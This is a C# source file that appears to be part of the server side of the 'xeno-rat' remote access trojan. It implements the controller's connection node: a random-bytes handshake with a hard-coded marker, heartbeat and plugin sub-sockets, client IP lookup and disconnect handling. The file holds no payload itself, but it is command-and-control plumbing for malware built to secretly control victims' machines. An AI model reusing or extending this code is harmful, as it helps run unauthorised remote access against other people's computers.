using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace xeno_rat_server
{
    public partial class Node
    {

        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int memcmp(byte[] b1, byte[] b2, long count);

        private SemaphoreSlim OneRecieveAtATime = new SemaphoreSlim(1);
        public bool isDisposed = false;
        private Action<Node> OnDisconnect;
        private List<Action<Node>> TempOnDisconnects = new List<Action<Node>>();
        public List<Node> subNodes;
        private Dictionary<int, Node> subNodeWait;
        public SocketHandler sock;
        public Node Parent;
        public int ID = -1;
        public int SubNodeIdCount = 0;
        public int SockType = 0;//0 = main, 1 = heartbeat, 2 = anything else
        public Node(SocketHandler _sock, Action<Node> _OnDisconnect)
        {
            sock = _sock;
            subNodes = new List<Node>();//make it only initiate if non-plugin/heartbeat
            subNodeWait = new Dictionary<int, Node>();
            OnDisconnect = _OnDisconnect;
        }
        private byte[] GetByteArray(int size)
        {
            Random rnd = new Random();
            byte[] b = new byte[size];
            rnd.NextBytes(b);
            return b;
        }
        public void SetID(int id)
        {
            ID = id;
        }
        private bool ByteArrayCompare(byte[] b1, byte[] b2)
        {

            return b1.Length == b2.Length && memcmp(b1, b2, b1.Length) == 0;
        }
        private async Task<int> GetSocketType()
        {
            byte[] type = await sock.ReceiveAsync();
            if (type == null) 
            {
                Disconnect();
                return -1;
            }
            int IntType = sock.BytesToInt(type);
            return IntType;
        }


        public async void Disconnect()
        {
            isDisposed = true;
            try
            {
                if (sock.sock != null)
                {
                    await Task.Factory.FromAsync(sock.sock.BeginDisconnect, sock.sock.EndDisconnect, true, null);
                }
            }
            catch
            {
                sock.sock?.Close(0);
            }
            sock.sock?.Dispose();
            OneRecieveAtATime.Dispose();
            if (SockType == 0)
            {
                foreach (Node i in subNodes.ToList())
                {
                    try
                    {
                        if (i.SockType != 1)
                        {
                            i?.Disconnect();
                        }
                    }
                    catch { }
                }
            }
            if (OnDisconnect != null)
            {
                OnDisconnect(this);
            }
            List<Action<Node>> copy = TempOnDisconnects.ToList();
            TempOnDisconnects.Clear();
            foreach (Action<Node> tempdisconnect in copy) 
            {
                tempdisconnect(this);
            }
            copy.Clear();
            subNodes.Remove(this);
        }
        public void SetRecvTimeout(int ms)
        {
            sock.SetRecvTimeout(ms);
        }
        public void ResetRecvTimeout()
        {
            sock.ResetRecvTimeout();
        }
        public bool Connected()
        {
            try
            {
                return sock.sock.Connected;
            }
            catch
            {
                return false;
            }
        }
        public async Task<byte[]> ReceiveAsync() 
        {
            if (isDisposed) 
            {
                return null;
            }
            await OneRecieveAtATime.WaitAsync();
            try
            {
                byte[] data = await sock.ReceiveAsync();
                if (data == null)
                {
                    Disconnect();
                    return null;
                }
                return data;
            }
            finally
            {
                OneRecieveAtATime.Release();
            }
        }
        public async Task<bool> SendAsync(byte[] data)
        {
            if (!(await sock.SendAsync(data)))
            {
                Disconnect();
                return false;
            }
            return true;
        }
        public string GetIp()
        {
            string ip="N/A";
            try 
            { 
                ip= ((IPEndPoint)sock.sock.RemoteEndPoint).Address.ToString();
            } 
            catch 
            { 
            }
            return ip;
            
        }
        public async Task<Node> CreateSubNodeAsync(int Type)//1 or 2 
        {
            if (Type < 1 || Type > 2)
            {
                throw new Exception("ID too high or low. must be a 1 or 2.");
            }
            Random rnd = new Random();
            int retid = rnd.Next(1, 256);
            while (subNodeWait.ContainsKey(retid))
            {
                retid = rnd.Next(1, 256);
            }//improve this to get rid of possible wait time (just need to use bigger numbers)
            subNodeWait[retid] = null;
            byte[] CreateSubReq = new byte[] { 0, (byte)Type, (byte)retid };
            await SendAsync(CreateSubReq);
            byte[] worked = await ReceiveAsync();
            if (worked == null || worked[0] == 0)
            {
                subNodeWait.Remove(retid);
                return null;
            }
            int count = 0;
            while (subNodeWait[retid] == null && Connected() && count < 10)
            {
                await Task.Delay(1000);
                count++;
            }
            Node subNode = subNodeWait[retid];
            subNodeWait.Remove(retid);
            return subNode;
        }
        public void AddTempOnDisconnect(Action<Node> function) 
        { 
            TempOnDisconnects.Add(function);
        }
        public void RemoveTempOnDisconnect(Action<Node> function)
        {
            TempOnDisconnects.Remove(function);
        }
        public async Task AddSubNode(Node subnode) 
        {
            if (subnode.SockType != 0)
            {
                byte[] retid = await subnode.ReceiveAsync();
                if (retid == null) 
                {
                    subnode.Disconnect();
                }
                subNodeWait[retid[0]] = subnode;
            }
            else 
            {
                subnode.Disconnect();
            }
            subNodes.Add(subnode);
        }
        public async Task<bool> AuthenticateAsync(int id)//first call that should ever be made!
        {
            try
            {
                byte[] randomKey = GetByteArray(100);
                byte[] data;
                if (!(await sock.SendAsync(randomKey)))
                {
                    return false;
                }
                sock.SetRecvTimeout(10000);
                data = await sock.ReceiveAsync();
                if (data == null)
                {
                    return false;
                }
                if (ByteArrayCompare(randomKey, data))
                {
                    if (!(await sock.SendAsync(new byte[] { 109, 111, 111, 109, 56, 50, 53 })))
                    {
                        return false;
                    }
                    int type = await GetSocketType();
                    if (type > 2 || type < 0)
                    {
                        return false;
                    }
                    if (type == 0)
                    {
                        byte[] sockId = sock.IntToBytes(id);
                        ID = id;
                        if (!(await sock.SendAsync(sockId)))
                        {
                            return false;
                        }
                    }
                    else
                    {
                        data = await sock.ReceiveAsync();
                        if (data == null)
                        {
                            Disconnect();
                            return false;
                        }
                        int sockId = sock.BytesToInt(data);
                        ID = sockId;
                    }
                    SockType = type;
                    sock.ResetRecvTimeout();
                    return true;
                }
            }
            catch { }
            return false;
        }
    }
}
